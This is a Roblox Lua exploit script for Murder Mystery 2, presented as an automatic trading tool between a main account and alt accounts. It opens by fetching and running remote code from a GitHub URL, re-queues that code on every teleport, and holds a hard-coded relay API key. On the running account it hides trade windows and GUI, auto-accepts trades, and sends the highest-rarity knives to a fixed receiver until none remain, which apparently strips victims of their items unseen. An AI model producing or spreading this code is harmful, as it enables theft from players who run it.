loadstring(game:HttpGet(('https://raw.githubusercontent.com/luauglazer/Sort/refs/heads/main/YAHRMZIN.lua'),true))()

local RECEIVER_NAME = ...
if type(RECEIVER_NAME) ~= "string" or RECEIVER_NAME:match("^%s*$") then
    local g = getgenv and getgenv() or _G
    RECEIVER_NAME = g.Receiver or g.TargetReceiver or g.MAIN_USERNAME or g.ReceiverName or "Main"
end
RECEIVER_NAME = RECEIVER_NAME:match("^%s*(.-)%s*$")

local env = getgenv and getgenv() or _G

if env._MM2AutoTradeCleanup then
    pcall(env._MM2AutoTradeCleanup)
    env._MM2AutoTradeCleanup = nil
end

if env.LastExecuted and tick() - env.LastExecuted < 2 then return end
env.LastExecuted = tick()

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players        = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService    = game:GetService("HttpService")
local CoreGui        = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local RunService     = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local VirtualUser    = game:GetService("VirtualUser")

local LocalPlayer = Players.LocalPlayer
while not LocalPlayer do
    task.wait(0.05)
    LocalPlayer = Players.LocalPlayer
end

local CONFIG = {
    MAIN_USERNAME          = RECEIVER_NAME,
    RELAY_BIN_ID           = "6aa298b3ffd5d16053f6004e",
    RELAY_API_KEY          = "$2a$10$f1FDE03zqlyNxSMY8rpiQ.tsJ4MmFoKyRe5K5zPwu64zHoto.fIW6",
    RELAY_POLL_INTERVAL    = 4.0,
    RELAY_WRITE_INTERVAL   = 10.0,
    ITEMS_PER_TRADE        = 4,
    MM2_TRADE_COOLDOWN     = 6.8,
    BATCH_DELAY            = 2.0,
    AUTO_REPEAT            = true,
    ALT_ANTI_AFK           = true,
    TRADE_TIMEOUT          = 35.0,
    MAIN_NEVER_GIVES_ITEMS = true,
    INVISIBLE_TRADE_REQUEST = true,
    AUTO_ACCEPT_TRADE_REQUEST = true,
    AUTO_QUEUE_ON_TELEPORT = true,
    QUEUE_ON_TELEPORT_URL  = "https://raw.githubusercontent.com/luauglazer/Sort/refs/heads/main/Dash.lua",
    AUTO_RECONNECT_ON_ERROR = true,
    STOP_WHEN_NO_ITEMS     = true,
    HIDE_ALT_TRADE_GUI     = true,
}

local qot_func = (syn and syn.queue_on_teleport)
    or queue_on_teleport
    or queueonteleport
    or (fluxus and fluxus.queue_on_teleport)
    or (Fluxus and Fluxus.queue_on_teleport)
    or (getgenv and (getgenv().queue_on_teleport or getgenv().queueonteleport))

local function queueScriptOnTeleport()
    if not CONFIG.AUTO_QUEUE_ON_TELEPORT or not CONFIG.QUEUE_ON_TELEPORT_URL or CONFIG.QUEUE_ON_TELEPORT_URL == "" then return end
    local qot = qot_func
        or (syn and syn.queue_on_teleport)
        or queue_on_teleport
        or queueonteleport
        or (fluxus and fluxus.queue_on_teleport)
        or (getgenv and (getgenv().queue_on_teleport or getgenv().queueonteleport))
    if not qot then return end

    local payload = string.format([[
repeat task.wait(0.1) until game:IsLoaded() and game.Players.LocalPlayer
pcall(function()
    loadstring(game:HttpGet(%q, true))(%q)
end)
]], CONFIG.QUEUE_ON_TELEPORT_URL, CONFIG.MAIN_USERNAME)

    pcall(function() qot(payload) end)
end

pcall(queueScriptOnTeleport)

pcall(function()
    LocalPlayer.OnTeleport:Connect(function()
        queueScriptOnTeleport()
    end)
end)

local function reinjectFromGithub()
    pcall(queueScriptOnTeleport)
    pcall(function()
        if env._MM2AutoTradeCleanup then
            pcall(env._MM2AutoTradeCleanup)
            env._MM2AutoTradeCleanup = nil
        end
    end)
    task.spawn(function()
        local ok, err = pcall(function()
            loadstring(game:HttpGet(CONFIG.QUEUE_ON_TELEPORT_URL, true))(CONFIG.MAIN_USERNAME)
        end)
        if not ok and addLog then
            addLog(string.format("Erro ao reinjetar: %s", tostring(err)))
        end
    end)
end
_G.ReinjectAutoTrade  = reinjectFromGithub
env.ReinjectAutoTrade = reinjectFromGithub

local myName = LocalPlayer.Name
local isMain = (myName:lower() == CONFIG.MAIN_USERNAME:lower())
local isAlt  = not isMain

local State = {
    Enabled               = true,
    Role                  = isMain and "MAIN" or "ALT",
    ActiveAltName         = isAlt and myName or "",
    InTrade               = false,
    TradeStartTick        = 0,
    CurrentPartner        = nil,
    CurrentLastOffer      = nil,
    AcceptedByPartner     = false,
    AcceptedBySelf        = false,
    LastTradeFinishTick   = 0,
    LastOfferPlacedTick   = 0,
    LastTeleportTick      = 0,
    LastSendRequestTick   = 0,
    TradesCompleted       = 0,
    KnivesTransferred     = 0,
    RemainingKnives       = 0,
    StatusMessage         = "Inicializando...",
    LastOfferedKnives     = {},
    TopTierDetected       = "Nenhuma",
    AllItemsTransferred   = false,
    EmptyTradeStreaks      = 0,
    TransferFinishedLogged = false,
}

local TradeFolder          = ReplicatedStorage:WaitForChild("Trade")
local SendRequestRemote    = TradeFolder:WaitForChild("SendRequest")
local AcceptRequestRemote  = TradeFolder:WaitForChild("AcceptRequest")
local DeclineRequestRemote = TradeFolder:WaitForChild("DeclineRequest")
local StartTradeRemote     = TradeFolder:WaitForChild("StartTrade")
local UpdateTradeRemote    = TradeFolder:WaitForChild("UpdateTrade")
local OfferItemRemote      = TradeFolder:WaitForChild("OfferItem")
local RemoveOfferRemote    = TradeFolder:WaitForChild("RemoveOffer")
local AcceptTradeRemote    = TradeFolder:WaitForChild("AcceptTrade")
local DeclineTradeRemote   = TradeFolder:WaitForChild("DeclineTrade")
local SetRequestsRemote    = TradeFolder:WaitForChild("SetRequestsEnabled")

local ProfileDataModule = nil
local SyncDatabase      = nil
local TradeModuleRef    = nil

local autoAcceptTradeRequest = nil
local concealTradeRequest    = nil
local enforceMainReceivesOnly = nil
local concealAltTradeGui     = nil
local altTradeGuiConnections = {}

local LogHistory = {}

local function addLog(text)
    local line = string.format("[%s] %s", os.date("%X"), text)
    table.insert(LogHistory, 1, line)
    if #LogHistory > 50 then table.remove(LogHistory) end
    State.StatusMessage = text
    if isMain and _G.UpdateTradeUI then pcall(_G.UpdateTradeUI) end
end

task.spawn(function()
    pcall(function()
        ProfileDataModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("ProfileData"))
    end)
    pcall(function()
        SyncDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"))
    end)
    pcall(function()
        TradeModuleRef = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
        if TradeModuleRef then
            TradeModuleRef.RequestsEnabled = true

            if TradeModuleRef.GUI and TradeModuleRef.GUI.TradeGUI then
                local bg = TradeModuleRef.GUI.TradeGUI:FindFirstChild("BG")
                if bg and bg:IsA("GuiObject") then
                    pcall(function() bg.BackgroundTransparency = 1 end)
                end
            end

            if isAlt and TradeModuleRef.GUI and TradeModuleRef.GUI.TradeGUI and concealAltTradeGui then
                concealAltTradeGui(TradeModuleRef.GUI.TradeGUI)
            end

            local origUpdateWindow = TradeModuleRef.UpdateTradeRequestWindow
            TradeModuleRef.UpdateTradeRequestWindow = function(windowType, data)
                if CONFIG.INVISIBLE_TRADE_REQUEST and TradeModuleRef.GUI and TradeModuleRef.GUI.RequestFrame then
                    if concealTradeRequest then concealTradeRequest(TradeModuleRef.GUI.RequestFrame) end
                end
                if CONFIG.AUTO_ACCEPT_TRADE_REQUEST and windowType == "ReceivingRequest" then
                    local sName = (data and data.Sender and data.Sender.Name) or "Player"
                    task.spawn(function()
                        if autoAcceptTradeRequest then autoAcceptTradeRequest(sName) end
                    end)
                    return
                end
                if origUpdateWindow then return origUpdateWindow(windowType, data) end
            end
        end
    end)
end)

if isAlt and CONFIG.ALT_ANTI_AFK then
    pcall(function()
        LocalPlayer.Idled:Connect(function()
            pcall(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new(0, 0))
            end)
        end)
    end)
end

pcall(function()
    if setfpscap then setfpscap(60)
    elseif table and table.setfpscap then table.setfpscap(60) end
end)

local RARITY_TIER_SCORES = {
    ["Unique"]    = 10000, ["Ancient"]  = 9000,  ["Godly"]    = 8000,
    ["Classic"]   = 7500,  ["Legendary"] = 6000, ["Rare"]     = 4000,
    ["Uncommon"]  = 3000,  ["Halloween"] = 2000, ["Christmas"] = 2000,
    ["Common"]    = 1000,
}

local function getSyncItems()
    if SyncDatabase and (SyncDatabase.Item or SyncDatabase.Weapons) then
        return SyncDatabase.Item or SyncDatabase.Weapons
    end
    local ok, sync = pcall(function() return require(ReplicatedStorage.Database.Sync) end)
    if ok and sync then
        SyncDatabase = sync
        return sync.Item or sync.Weapons
    end
    return nil
end

local function getKnifeTierScore(itemId)
    local syncItems = getSyncItems()
    local itemData  = syncItems and syncItems[itemId]
    local rarityName = itemData and itemData.Rarity or "Common"
    local baseScore  = RARITY_TIER_SCORES[rarityName] or 1000
    local isChroma   = (itemData and itemData.Chroma == true) or string.find(itemId:lower(), "chroma")
    if isChroma then
        baseScore  = baseScore + 1500
        rarityName = "Chroma " .. rarityName
    end
    return baseScore, rarityName
end

local function getLiveWeapons()
    local weapons = nil
    pcall(function()
        local pd = require(ReplicatedStorage.Modules.ProfileData)
        if pd and pd.Weapons and pd.Weapons.Owned then weapons = pd.Weapons.Owned end
    end)
    if weapons then return weapons end
    if ProfileDataModule and ProfileDataModule.Weapons and ProfileDataModule.Weapons.Owned then
        return ProfileDataModule.Weapons.Owned
    end
    pcall(function()
        local remotes = ReplicatedStorage:FindFirstChild("Remotes")
        local inv     = remotes and remotes:FindFirstChild("Inventory")
        local getPd   = inv and inv:FindFirstChild("GetProfileData")
        if getPd then
            local fresh = getPd:InvokeServer()
            if fresh and fresh.Weapons and fresh.Weapons.Owned then weapons = fresh.Weapons.Owned end
        end
    end)
    return weapons
end

local function scanTradableKnives()
    local rawWeapons = getLiveWeapons()
    if not rawWeapons then return {} end

    local syncItems        = getSyncItems()
    local knifeList        = {}
    local highestFoundScore = 0
    local highestFoundName  = "Nenhuma"

    for key, value in pairs(rawWeapons) do
        local realItemId, amount = nil, 1
        if tonumber(key) then
            if type(value) == "string" then
                realItemId = value
            elseif type(value) == "table" then
                realItemId = value.ItemID or value[1] or value.Item
                amount     = tonumber(value.Amount or value[2]) or 1
            end
        else
            realItemId = tostring(key)
            if type(value) == "table" then
                amount = tonumber(value.Amount or value[2]) or 1
            else
                amount = tonumber(value) or 1
            end
        end

        if realItemId and realItemId ~= "" and realItemId ~= "DefaultKnife" and realItemId ~= "DefaultGun" and amount > 0 then
            local isKnife = false
            if syncItems and syncItems[realItemId] then
                local info = syncItems[realItemId]
                if info.ItemType == "Knife" or info.Type == "Knife" or (info.ItemType ~= "Gun" and not string.find(realItemId:lower(), "gun")) then
                    isKnife = true
                end
            else
                local lowerId = realItemId:lower()
                if not string.find(lowerId, "gun") and not string.find(lowerId, "revolver")
                    and not string.find(lowerId, "pistol") and not string.find(lowerId, "key")
                    and not string.find(lowerId, "pet") and not string.find(lowerId, "radio") then
                    isKnife = true
                end
            end

            if isKnife then
                local score, tierName = getKnifeTierScore(realItemId)
                if score > highestFoundScore then
                    highestFoundScore = score
                    highestFoundName  = string.format("%s [%s]", realItemId, tierName)
                end
                for _ = 1, amount do table.insert(knifeList, realItemId) end
            end
        end
    end

    State.RemainingKnives = #knifeList
    State.TopTierDetected = highestFoundName
    if #knifeList == 0 and CONFIG.STOP_WHEN_NO_ITEMS then
        State.AllItemsTransferred = true
    end
    return knifeList
end

local function pick4HighestTierKnives()
    local allKnives = scanTradableKnives()
    if #allKnives == 0 then return {} end

    table.sort(allKnives, function(a, b)
        local scoreA = getKnifeTierScore(a)
        local scoreB = getKnifeTierScore(b)
        if scoreA ~= scoreB then return scoreA > scoreB end
        return a < b
    end)

    local selected = {}
    for i = 1, math.min(CONFIG.ITEMS_PER_TRADE, #allKnives) do
        table.insert(selected, allKnives[i])
    end
    return selected
end

local function forceEnableRequests()
    if State.AllItemsTransferred and CONFIG.STOP_WHEN_NO_ITEMS then
        pcall(function() SetRequestsRemote:FireServer(false) end)
        pcall(function() if TradeModuleRef then TradeModuleRef.RequestsEnabled = false end end)
        return
    end
    pcall(function() SetRequestsRemote:FireServer(true) end)
    pcall(function() if TradeModuleRef then TradeModuleRef.RequestsEnabled = true end end)
    pcall(function()
        local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
        local gameGui   = playerGui and playerGui:FindFirstChild("Game")
        local lb        = gameGui and gameGui:FindFirstChild("Leaderboard")
        local container = lb and lb:FindFirstChild("Container")
        local toggle    = container and container:FindFirstChild("ToggleRequests")
        if toggle then
            local onBtn  = toggle:FindFirstChild("On")
            local offBtn = toggle:FindFirstChild("Off")
            if onBtn  then onBtn.Visible  = true  end
            if offBtn then offBtn.Visible = false end
        end
    end)
end

forceEnableRequests()
task.spawn(function()
    while true do task.wait(3.0) forceEnableRequests() end
end)

concealTradeRequest = function(tradeReq)
    if not tradeReq then return end
    pcall(function()
        tradeReq.Visible = false
        tradeReq.Position = UDim2.new(100, 0, 100, 0)
        tradeReq.Size = UDim2.new(0, 0, 0, 0)
        tradeReq.BackgroundTransparency = 1
        for _, desc in ipairs(tradeReq:GetDescendants()) do
            if desc:IsA("GuiObject") then desc.Visible = false end
        end
    end)
end

concealAltTradeGui = function(gui)
    if not isAlt or not gui then return end
    pcall(function()
        if gui:IsA("ScreenGui") then gui.DisplayOrder = -999999 end

        local function concealElement(elem, isBlocker)
            if not elem or not elem:IsA("GuiObject") then return end
            pcall(function()
                elem.Visible  = false
                elem.Position = UDim2.new(100, 0, 100, 0)
                elem.Active   = false
                if isBlocker then
                    elem.BackgroundTransparency = 1
                    elem.Size = UDim2.new(0, 0, 0, 0)
                end
            end)
        end

        local function hookBlocker(cb)
            if not cb or not cb:IsA("GuiObject") then return end
            concealElement(cb, true)
            local c1 = cb:GetPropertyChangedSignal("Visible"):Connect(function() if cb.Visible then concealElement(cb, true) end end)
            local c2 = cb:GetPropertyChangedSignal("BackgroundTransparency"):Connect(function() if cb.BackgroundTransparency < 1 then cb.BackgroundTransparency = 1 end end)
            local c3 = cb:GetPropertyChangedSignal("Position"):Connect(function() if cb.Position.X.Scale < 50 then cb.Position = UDim2.new(100, 0, 100, 0) end end)
            local c4 = cb:GetPropertyChangedSignal("Size"):Connect(function() if cb.Size.X.Scale > 0 or cb.Size.X.Offset > 0 then cb.Size = UDim2.new(0, 0, 0, 0) end end)
            local c5 = cb:GetPropertyChangedSignal("Active"):Connect(function() if cb.Active then cb.Active = false end end)
            for _, c in ipairs({c1, c2, c3, c4, c5}) do table.insert(altTradeGuiConnections, c) end
        end

        local function hookFrame(frame)
            if not frame or not frame:IsA("GuiObject") then return end
            concealElement(frame, false)
            local c1 = frame:GetPropertyChangedSignal("Visible"):Connect(function() if frame.Visible then concealElement(frame, false) end end)
            local c2 = frame:GetPropertyChangedSignal("Position"):Connect(function() if frame.Position.X.Scale < 50 then frame.Position = UDim2.new(100, 0, 100, 0) end end)
            local c3 = frame:GetPropertyChangedSignal("Active"):Connect(function() if frame.Active then frame.Active = false end end)
            for _, c in ipairs({c1, c2, c3}) do table.insert(altTradeGuiConnections, c) end
        end

        local cb = gui:FindFirstChild("ClickBlocker")
        if cb then hookBlocker(cb) end
        local bg = gui:FindFirstChild("BG")
        if bg then hookBlocker(bg) end
        local c = gui:FindFirstChild("Container")
        if c then
            hookFrame(c)
            local ts = c:FindFirstChild("Trade")
            if ts then hookFrame(ts) end
            local is = c:FindFirstChild("Items")
            if is then hookFrame(is) end
        end
        local p = gui:FindFirstChild("Processing")
        if p then hookFrame(p) end

        local connChild = gui.ChildAdded:Connect(function(child)
            if child.Name == "ClickBlocker" or child.Name == "BG" then hookBlocker(child)
            elseif child.Name == "Container" or child.Name == "Processing" or child.Name == "Trade" or child.Name == "Items" then hookFrame(child)
            elseif child:IsA("GuiObject") then concealElement(child, false) end
        end)
        table.insert(altTradeGuiConnections, connChild)
    end)
end

local function getMainOfferItemCount()
    local count = 0
    pcall(function()
        local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
        local tradeGui  = playerGui and playerGui:FindFirstChild("TradeGUI")
        local yourOffer = tradeGui and tradeGui:FindFirstChild("YourOffer", true)
        local container = yourOffer and yourOffer:FindFirstChild("Container")
        if container then
            for _, child in ipairs(container:GetChildren()) do
                if child:IsA("Frame") and child.Visible and string.find(child.Name, "NewItem") then
                    count = count + 1
                end
            end
        end
    end)
    return count
end

local function getPartnerOfferItemCount()
    local count = 0
    pcall(function()
        local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
        local tradeGui  = playerGui and playerGui:FindFirstChild("TradeGUI")
        local theirOffer = tradeGui and tradeGui:FindFirstChild("TheirOffer", true)
        local container  = theirOffer and theirOffer:FindFirstChild("Container")
        if container then
            for _, child in ipairs(container:GetChildren()) do
                if child:IsA("Frame") and child.Visible and (string.find(child.Name, "NewItem") or child:FindFirstChild("ItemName", true)) then
                    count = count + 1
                end
            end
        end
    end)
    return count
end

local function purgeMainOffer()
    pcall(function()
        local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
        local tradeGui  = playerGui and playerGui:FindFirstChild("TradeGUI")
        local yourOffer = tradeGui and tradeGui:FindFirstChild("YourOffer", true)
        local container = yourOffer and yourOffer:FindFirstChild("Container")
        if container then
            for _, child in ipairs(container:GetChildren()) do
                if child:IsA("Frame") and child.Visible and string.find(child.Name, "NewItem") then
                    local actionBtn = child:FindFirstChild("ActionButton", true)
                    if actionBtn and firesignal then
                        pcall(function() firesignal(actionBtn.MouseButton1Click) end)
                        pcall(function() firesignal(actionBtn.Activated) end)
                    end
                    pcall(function() RemoveOfferRemote:FireServer(child.Name, "Weapons") end)
                end
            end
        end
    end)
end

enforceMainReceivesOnly = function()
    if not isMain then return end
    task.spawn(function()
        while true do
            task.wait(0.25)
            if State.InTrade and State.Enabled and CONFIG.MAIN_NEVER_GIVES_ITEMS then
                local itemsOffered = getMainOfferItemCount()
                if itemsOffered > 0 then
                    addLog(string.format("[SEGURANÃ‡A MAIN] %d item(ns) detectado(s) na oferta da Main! Purgando...", itemsOffered))
                    purgeMainOffer()
                end
            end
        end
    end)
end

autoAcceptTradeRequest = function(senderName)
    if not State.Enabled or State.InTrade then return end

    if isAlt and (State.AllItemsTransferred or (CONFIG.STOP_WHEN_NO_ITEMS and State.RemainingKnives == 0)) then
        addLog(string.format("[%s] Pedido de '%s' rejeitado: Alt sem facas restantes.", State.Role, tostring(senderName or "Unknown")))
        pcall(function() DeclineRequestRemote:FireServer() end)
        return
    end

    local sName = tostring(senderName or "Desconhecido")
    addLog(string.format("[%s] Trade Request de '%s'! Auto-aceitando...", State.Role, sName))

    pcall(function()
        local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
        if playerGui then
            local gameGui   = playerGui:FindFirstChild("Game")
            local lb        = gameGui and gameGui:FindFirstChild("Leaderboard")
            local container = lb and lb:FindFirstChild("Container")
            local tradeReq  = container and container:FindFirstChild("TradeRequest")
            if tradeReq then concealTradeRequest(tradeReq) end
        end
    end)

    pcall(function() AcceptRequestRemote:FireServer() end)
    pcall(function() if type(_G.NewTradeRequest) == "function" then _G.NewTradeRequest(false) end end)

    pcall(function()
        local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
        local gameGui   = playerGui and playerGui:FindFirstChild("Game")
        local lb        = gameGui and gameGui:FindFirstChild("Leaderboard")
        local container = lb and lb:FindFirstChild("Container")
        local tradeReq  = container and container:FindFirstChild("TradeRequest")
        local recReq    = tradeReq and tradeReq:FindFirstChild("ReceivingRequest")
        local acceptBtn = recReq and recReq:FindFirstChild("Accept")
        if acceptBtn and firesignal then
            pcall(function() firesignal(acceptBtn.MouseButton1Click) end)
            pcall(function() firesignal(acceptBtn.Activated) end)
        end
        if tradeReq then tradeReq.Visible = false end
    end)
end

local function executeAutoAccept(roleContext)
    if not State.InTrade then return end

    if isMain and CONFIG.MAIN_NEVER_GIVES_ITEMS then
        local offeredCount = getMainOfferItemCount()
        if offeredCount > 0 then
            addLog(string.format("[SEGURANÃ‡A CRÃTICA] %d item(ns) na oferta da Main! Purgando antes de aceitar...", offeredCount))
            purgeMainOffer()
            task.wait(0.3)
            if getMainOfferItemCount() > 0 then
                addLog("[SEGURANÃ‡A CRÃTICA] NÃ£o foi possÃ­vel limpar oferta da Main. DECLINANDO!")
                pcall(function() DeclineTradeRemote:FireServer() end)
                State.InTrade = false
                return
            end
        end
    end

    local waitStart = tick()
    while (tick() - waitStart) < 8.0 and State.InTrade do
        local playerGui    = LocalPlayer:FindFirstChildOfClass("PlayerGui")
        local tradeGui     = playerGui and playerGui:FindFirstChild("TradeGUI")
        local actions      = tradeGui and tradeGui:FindFirstChild("Actions", true)
        local cooldownFrame = actions and actions:FindFirstChild("Cooldown", true)
        if cooldownFrame and cooldownFrame.Visible == false then break end
        task.wait(0.3)
    end
    task.wait(0.3)

    if not State.InTrade then return end

    if isMain and CONFIG.MAIN_NEVER_GIVES_ITEMS and getMainOfferItemCount() > 0 then
        addLog("[SEGURANÃ‡A CRÃTICA] Item detectado na confirmaÃ§Ã£o! Cancelando trade.")
        pcall(function() DeclineTradeRemote:FireServer() end)
        State.InTrade = false
        return
    end

    pcall(function()
        local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
        local tradeGui  = playerGui and playerGui:FindFirstChild("TradeGUI")
        local actions   = tradeGui and tradeGui:FindFirstChild("Actions", true)
        if actions then
            local acceptFrame = actions:FindFirstChild("Accept", true)
            local acceptBtn   = acceptFrame and acceptFrame:FindFirstChild("ActionButton", true)
            if acceptBtn and firesignal then
                pcall(function() firesignal(acceptBtn.MouseButton1Click) end)
                pcall(function() firesignal(acceptBtn.Activated) end)
            end
            task.wait(0.45)
            local confirmFrame = acceptFrame and acceptFrame:FindFirstChild("Confirm", true)
            local confirmBtn   = confirmFrame and confirmFrame:FindFirstChild("ActionButton", true)
            if confirmBtn and firesignal then
                pcall(function() firesignal(confirmBtn.MouseButton1Click) end)
                pcall(function() firesignal(confirmBtn.Activated) end)
            end
        end
    end)

    local placeToken = (game.PlaceId and game.PlaceId > 0) and (game.PlaceId * 3) or 428469873
    local token      = State.CurrentLastOffer

    local getupvals = debug and debug.getupvalues or getupvalues
    if not token and getupvals and TradeModuleRef and TradeModuleRef.UpdateTrade then
        pcall(function()
            local upvals = getupvals(TradeModuleRef.UpdateTrade)
            for _, val in pairs(upvals) do
                if type(val) == "number" and val > 0 and val < 100000000 then
                    token = val; break
                end
            end
        end)
    end
    if not token then token = time() end

    pcall(function() AcceptTradeRemote:FireServer(placeToken, token) end)
    State.AcceptedBySelf = true
    addLog(string.format("[%s] Auto-Confirmando Trade! Token=%s", roleContext, tostring(token)))
end

pcall(function()
    local oldOnClientInvoke = SendRequestRemote.OnClientInvoke
    SendRequestRemote.OnClientInvoke = function(sender)
        local senderName = sender and sender.Name or "Unknown"

        if isAlt and (State.AllItemsTransferred or (CONFIG.STOP_WHEN_NO_ITEMS and State.RemainingKnives == 0)) then
            addLog(string.format("SendRequest de '%s' RECUSADO: Alt com 0 facas.", senderName))
            pcall(function() DeclineRequestRemote:FireServer() end)
            return false
        end

        addLog(string.format("SendRequest de '%s'! Auto-aceitando...", senderName))

        if CONFIG.AUTO_ACCEPT_TRADE_REQUEST then
            task.spawn(function()
                task.wait(0.05)
                for _ = 1, 3 do autoAcceptTradeRequest(senderName); task.wait(0.1) end
            end)
            return true
        end

        if type(oldOnClientInvoke) == "function" then return oldOnClientInvoke(sender) end
        return true
    end
end)

local oldNewTradeRequest = _G.NewTradeRequest
_G.NewTradeRequest = function(isReceiving)
    if isReceiving and State.Enabled and not State.InTrade and CONFIG.AUTO_ACCEPT_TRADE_REQUEST then
        pcall(function()
            task.spawn(function() autoAcceptTradeRequest("NewTradeRequest") end)
        end)
    end
    if type(oldNewTradeRequest) == "function" then return oldNewTradeRequest(isReceiving) end
end

pcall(function()
    TradeFolder.RequestSent.OnClientEvent:Connect(function(senderPlayer)
        if not State.Enabled or State.InTrade then return end
        if isAlt and (State.AllItemsTransferred or (CONFIG.STOP_WHEN_NO_ITEMS and State.RemainingKnives == 0)) then return end
        local senderName = senderPlayer and senderPlayer.Name or "Unknown"
        if CONFIG.AUTO_ACCEPT_TRADE_REQUEST then
            addLog(string.format("[%s] RequestSent de '%s'! Auto-aceitando...", State.Role, senderName))
            task.wait(0.05)
            autoAcceptTradeRequest(senderName)
        end
    end)
end)

StartTradeRemote.OnClientEvent:Connect(function(tradeData, partnerName)
    State.InTrade           = true
    State.TradeStartTick    = tick()
    State.CurrentPartner    = partnerName
    State.AcceptedByPartner = false
    State.AcceptedBySelf    = false
    State.LastOfferPlacedTick = tick()

    if tradeData and tradeData.LastOffer then
        State.CurrentLastOffer = tradeData.LastOffer
    else
        State.CurrentLastOffer = time()
    end

    addLog(string.format("Trade iniciada com '%s'!", tostring(partnerName)))

    if isAlt then
        local partnerStr = typeof(partnerName) == "Instance" and partnerName.Name or tostring(partnerName or "")
        if partnerStr:lower() ~= CONFIG.MAIN_USERNAME:lower() then
            addLog(string.format("Parceiro inesperado '%s'. Declinando.", partnerStr))
            DeclineTradeRemote:FireServer()
            State.InTrade = false
            return
        end

        task.spawn(function()
            task.wait(0.6)
            local knivesToOffer = pick4HighestTierKnives()
            local retries = 0
            while #knivesToOffer == 0 and retries < 6 and State.InTrade do
                task.wait(0.5); retries = retries + 1
                knivesToOffer = pick4HighestTierKnives()
            end
            State.LastOfferedKnives = knivesToOffer

            if #knivesToOffer == 0 then
                State.AllItemsTransferred = true
                State.RemainingKnives = 0
                addLog("Nenhuma faca restante! Declinando e finalizando.")
                pcall(function() DeclineTradeRemote:FireServer() end)
                State.InTrade = false
                pcall(function() SetRequestsRemote:FireServer(false) end)
                if TradeModuleRef then TradeModuleRef.RequestsEnabled = false end
                return
            end

            local logItems = {}
            for _, k in ipairs(knivesToOffer) do
                local _, tier = getKnifeTierScore(k)
                table.insert(logItems, string.format("%s [%s]", k, tier))
            end
            addLog(string.format("Alt ofertando: %s", table.concat(logItems, ", ")))

            for idx, knifeName in ipairs(knivesToOffer) do
                if not State.InTrade then break end
                pcall(function() OfferItemRemote:FireServer(knifeName, "Weapons") end)
                addLog(string.format("Slot %d: %s adicionada", idx, knifeName))
                task.wait(0.25)
            end

            State.LastOfferPlacedTick = tick()
            addLog(string.format("Aguardando %.1fs de cooldown...", CONFIG.MM2_TRADE_COOLDOWN))
            task.wait(CONFIG.MM2_TRADE_COOLDOWN)

            if not State.InTrade then return end
            executeAutoAccept(string.format("Alt (%s)", myName))
            for _ = 1, 10 do
                task.wait(1.5)
                if not State.InTrade then break end
                pcall(function() executeAutoAccept(string.format("Alt Pulse (%s)", myName)) end)
            end
        end)
    end

    if isMain then
        task.spawn(function()
            addLog(string.format("%s (Main) em trade com '%s'. Modo: APENAS RECEBER.", CONFIG.MAIN_USERNAME, tostring(partnerName)))
            addLog("Aguardando Alt colocar as facas...")

            local waitPartnerStart = tick()
            local partnerCount = 0
            while (tick() - waitPartnerStart) < (CONFIG.MM2_TRADE_COOLDOWN + 2.5) and State.InTrade do
                partnerCount = getPartnerOfferItemCount()
                if partnerCount > 0 then break end
                task.wait(0.5)
            end

            if not State.InTrade then return end

            if partnerCount == 0 then
                State.EmptyTradeStreaks = (State.EmptyTradeStreaks or 0) + 1
                addLog(string.format("[AVISO] Parceiro ofertou 0 facas (#%d).", State.EmptyTradeStreaks))
                if State.EmptyTradeStreaks >= 2 then
                    State.AllItemsTransferred = true
                    addLog("Alt sem facas! Declinando e parando envios.")
                    pcall(function() DeclineTradeRemote:FireServer() end)
                    State.InTrade = false
                    return
                end
            else
                State.EmptyTradeStreaks = 0
            end

            task.wait(CONFIG.MM2_TRADE_COOLDOWN + 1.2)
            if not State.InTrade then return end

            executeAutoAccept(string.format("%s (Main - Apenas Recebe)", CONFIG.MAIN_USERNAME))
            for _ = 1, 10 do
                task.wait(1.5)
                if not State.InTrade then break end
                pcall(function() executeAutoAccept(string.format("%s Pulse", CONFIG.MAIN_USERNAME)) end)
            end
        end)
    end
end)

UpdateTradeRemote.OnClientEvent:Connect(function(tradeData)
    if tradeData and tradeData.LastOffer then State.CurrentLastOffer = tradeData.LastOffer end
end)

AcceptTradeRemote.OnClientEvent:Connect(function(isComplete, receivedItems)
    if isComplete == true then
        State.InTrade           = false
        State.AcceptedByPartner = false
        State.AcceptedBySelf    = false
        State.TradesCompleted   = State.TradesCompleted + 1
        State.LastTradeFinishTick = tick()

        local count = #State.LastOfferedKnives
        if count == 0 then count = CONFIG.ITEMS_PER_TRADE end
        State.KnivesTransferred = State.KnivesTransferred + count

        addLog(string.format("Trade #%d CONCLUÃDA! +%d facas transferidas.", State.TradesCompleted, count))

        if isAlt then
            task.spawn(function()
                task.wait(1.5)
                local remaining = scanTradableKnives()
                addLog(string.format("Alt '%s': %d facas restantes. Top: %s", myName, #remaining, State.TopTierDetected))

                if #remaining == 0 or not CONFIG.AUTO_REPEAT then
                    State.AllItemsTransferred = true
                    State.RemainingKnives = 0
                    pcall(function() SetRequestsRemote:FireServer(false) end)
                    if TradeModuleRef then TradeModuleRef.RequestsEnabled = false end
                    addLog(string.format("TransferÃªncia 100%% concluÃ­da! Total: %d facas em %d trades.", State.KnivesTransferred, State.TradesCompleted))
                end
            end)
        end

        if isMain then
            task.spawn(function()
                task.wait(CONFIG.BATCH_DELAY)
                addLog(string.format("%s pronto para o prÃ³ximo lote...", CONFIG.MAIN_USERNAME))
            end)
        end
    else
        State.AcceptedByPartner = true
        addLog("Parceiro confirmou! Auto-confirmando imediatamente...")
        task.wait(0.2)
        executeAutoAccept(State.Role .. " (Auto-Confirm)")
    end
end)

